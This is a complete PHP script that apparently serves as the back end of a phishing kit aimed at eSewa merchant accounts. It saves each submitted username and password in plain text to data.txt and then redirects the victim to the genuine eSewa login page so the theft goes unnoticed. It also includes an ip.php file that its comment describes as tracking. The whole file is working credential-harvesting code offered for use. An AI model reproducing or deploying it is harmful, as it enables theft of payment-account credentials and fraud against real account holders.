<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the username and password from the form
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Create a string to save in the data.txt file
    $data = "Username: $username, Password: $password\n";

    // Open the data.txt file and append the data
    $file = fopen("data.txt", "a");
    fwrite($file, $data);
    fclose($file);

    // Redirect to the specified link
    header("Location: https://merchant.esewa.com.np/auth/login");

    // Include the ip.php file for a subtle touch of tracking
    include("ip.php");

    exit();
} else {
    // Redirect to an error page if accessed directly
    header("Location: error.html");
    exit();
}
